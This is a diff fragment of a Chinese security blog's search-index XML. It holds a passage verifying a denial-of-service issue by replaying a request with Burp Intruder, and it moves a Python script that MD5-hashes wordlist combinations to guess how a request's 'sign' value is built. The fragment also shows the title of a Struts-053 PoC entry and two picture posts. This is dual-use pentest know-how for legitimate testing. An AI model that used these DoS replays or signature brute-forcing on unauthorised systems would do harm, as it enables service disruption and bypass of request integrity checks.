验证问题"></a># 0x03 验证问题</h2><blockquote><ul><li>使用Intruder重放上一请求10次，使用另一IP访问网站资源，发现文字类的加载为常规速度，但附属的所有图片类资源的加载延迟特别高；</li><li>关闭重放攻击后，使用上一步IP访问网站，文章和图片均加载速度回归常速，可判断问题确实存在。</li><li><strong>因为文字类和图片的加载速度差异，可猜测图片服务部署在一个单独服务器中的可能性很大。</strong></li></ul></blockquote>]]></content>
+      
+      
+        <tags>
+            
+            <tag> DOS </tag>
             
         </tags>
       
@@ -138,6 +243,21 @@
     </entry>
     
     <entry>
+      <title>Python的排列组合</title>
+      <link href="/2018/08/01/python%E7%9A%84%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/"/>
+      <url>/2018/08/01/python%E7%9A%84%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/</url>
+      <content type="html"><![CDATA[<h2 id="0x01-需求"><a href="#0x01-需求" class="headerlink" title="# 0x01 需求"></a># 0x01 需求</h2><blockquote><p>Python requirements：</p><ul><li>itertools</li><li>hashlib</li></ul></blockquote><h2 id="0x02"><a href="#0x02" class="headerlink" title="# 0x02"></a># 0x02</h2><p>测试的时候可能会发现提交的数据中有类似“sign”这样的值，这个值有很多时候是作为校验存在的，同时因为是加密后的密文所以难以被猜解，那么，有一种思路是这样的，这个值是请求包中的某个值或者某几个值进行加密，作为sign，这样既方便后端的校验，也同样保证了安全性。</p><p>所以需要对这个值进行Fuzz，说不定思路就对了呢~</p><blockquote><p>Usage:  python test.py test.py 3</p><p><strong>数字指定随机组合的位数，示例中的3标识，随机选取3个进行随机组合</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import md5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> cprint</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutations_md5</span><span class="params">(origin)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        md5_value =  hashlib.md5(origin).hexdigest()</span><br><span class="line">        <span class="keyword">print</span> md5_value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        cprint(<span class="string">'md5 error:'</span>, <span class="string">'red'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"check your origin value."</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutations</span><span class="params">(data, value)</span>:</span></span><br><span class="line">    data_array = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">        data_array.append(line.strip(<span class="string">'\n'</span>))</span><br><span class="line">    data_list = list(product(data_array, repeat=int(value)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data_list)):</span><br><span class="line">        md5_origin = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(int(value)):</span><br><span class="line">            md5_origin += data_list[i][ii]</span><br><span class="line">        permutations_md5(md5_origin)</span><br><span class="line">    cprint(<span class="string">"\n The process is Complete！"</span>, <span class="string">'green'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    random_int = sys.argv[<span class="number">2</span>]</span><br><span class="line">    keys = open(path, <span class="string">'r'</span>)</span><br><span class="line">    keys_data = keys.readlines()</span><br><span class="line">    <span class="keyword">if</span> int(random_int) &gt; len(keys_data):</span><br><span class="line">        cprint(<span class="string">"The value is to big."</span>, <span class="string">'red'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        permutations(keys_data, random_int)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>【One Poc One Day】—— Struts-053</title>
       <link href="/2018/08/01/%E3%80%90One-Poc-One-Day%E3%80%91%E2%80%94%E2%80%94Struts-053/"/>
       <url>/2018/08/01/%E3%80%90One-Poc-One-Day%E3%80%91%E2%80%94%E2%80%94Struts-053/</url>
@@ -162,21 +282,6 @@
         <tags>
             
             <tag> poc </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>Python的排列组合</title>
-      <link href="/2018/08/01/python%E7%9A%84%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/"/>
-      <url>/2018/08/01/python%E7%9A%84%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/</url>
-      <content type="html"><![CDATA[<h2 id="0x01-需求"><a href="#0x01-需求" class="headerlink" title="# 0x01 需求"></a># 0x01 需求</h2><blockquote><p>Python requirements：</p><ul><li>itertools</li><li>hashlib</li></ul></blockquote><h2 id="0x02"><a href="#0x02" class="headerlink" title="# 0x02"></a># 0x02</h2><p>测试的时候可能会发现提交的数据中有类似“sign”这样的值，这个值有很多时候是作为校验存在的，同时因为是加密后的密文所以难以被猜解，那么，有一种思路是这样的，这个值是请求包中的某个值或者某几个值进行加密，作为sign，这样既方便后端的校验，也同样保证了安全性。</p><p>所以需要对这个值进行Fuzz，说不定思路就对了呢~</p><blockquote><p>Usage:  python test.py test.py 3</p><p><strong>数字指定随机组合的位数，示例中的3标识，随机选取3个进行随机组合</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import md5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> cprint</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutations_md5</span><span class="params">(origin)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        md5_value =  hashlib.md5(origin).hexdigest()</span><br><span class="line">        <span class="keyword">print</span> md5_value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        cprint(<span class="string">'md5 error:'</span>, <span class="string">'red'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"check your origin value."</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutations</span><span class="params">(data, value)</span>:</span></span><br><span class="line">    data_array = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">        data_array.append(line.strip(<span class="string">'\n'</span>))</span><br><span class="line">    data_list = list(product(data_array, repeat=int(value)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data_list)):</span><br><span class="line">        md5_origin = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(int(value)):</span><br><span class="line">            md5_origin += data_list[i][ii]</span><br><span class="line">        permutations_md5(md5_origin)</span><br><span class="line">    cprint(<span class="string">"\n The process is Complete！"</span>, <span class="string">'green'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    random_int = sys.argv[<span class="number">2</span>]</span><br><span class="line">    keys = open(path, <span class="string">'r'</span>)</span><br><span class="line">    keys_data = keys.readlines()</span><br><span class="line">    <span class="keyword">if</span> int(random_int) &gt; len(keys_data):</span><br><span class="line">        cprint(<span class="string">"The value is to big."</span>, <span class="string">'red'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        permutations(keys_data, random_int)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
             
         </tags>
       
@@ -258,10 +363,10 @@
     </entry>
     
     <entry>
-      <title>【漫谈-转】Unix Permissions</title>
-      <link href="/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91Unix%20Permissions/"/>
-      <url>/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91Unix%20Permissions/</url>
-      <content type="html"><![CDATA[<h2 id="0×00-Unix-Permissions"><a href="#0×00-Unix-Permissions" class="headerlink" title="0×00 Unix Permissions"></a>0×00 Unix Permissions</h2><p>看到一张讲解Unix Permissions的图，画的简单易懂又好看。</p><p><img src="https://i.loli.net/2018/04/08/5ac98ad84a5ea.jpg" alt="UnixPermissions.jpg"></p>]]></content>
+      <title>【漫谈-转】System Call</title>
+      <link href="/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91System%20Call/"/>
+      <url>/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91System%20Call/</url>
+      <content type="html"><![CDATA[<h2 id="0×00-Process"><a href="#0×00-Process" class="headerlink" title="0×00 Process"></a>0×00 Process</h2><p>看到一张讲解System Call的图，画的简单易懂又好看。</p><p><img src="https://i.loli.net/2018/04/25/5ae0352e5101d.jpg" alt="系统调用.jpg"></p>]]></content>
       
       
         <tags>
@@ -273,10 +378,10 @@
     </entry>
     
     <entry>
-      <title>【漫谈-转】System Call</title>
-      <link href="/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91System%20Call/"/>
-      <url>/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91System%20Call/</url>
-      <content type="html"><![CDATA[<h2 id="0×00-Process"><a href="#0×00-Process" class="headerlink" title="0×00 Process"></a>0×00 Process</h2><p>看到一张讲解System Call的图，画的简单易懂又好看。</p><p><img src="https://i.loli.net/2018/04/25/5ae0352e5101d.jpg" alt="系统调用.jpg"></p>]]></content>
+      <title>【漫谈-转】Unix Permissions</title>
+      <link href="/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91Unix%20Permissions/"/>
+      <url>/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91Unix%20Permissions/</url>
+      <content type="html"><![CDATA[<h2 id="0×00-Unix-Permissions"><a href="#0×00-Unix-Permissions" class="headerlink" title="0×00 Unix Permissions"></a>0×00 Unix Permissions</h2><p>看到一张讲解Unix Permissions的图，画的简单易懂又好看。</p><p><img src="https://i.loli.net/2018/04/08/5ac98ad84a5ea.jpg" alt="UnixPermissions.jpg"></p>]]></content>
       
       
         <tags>
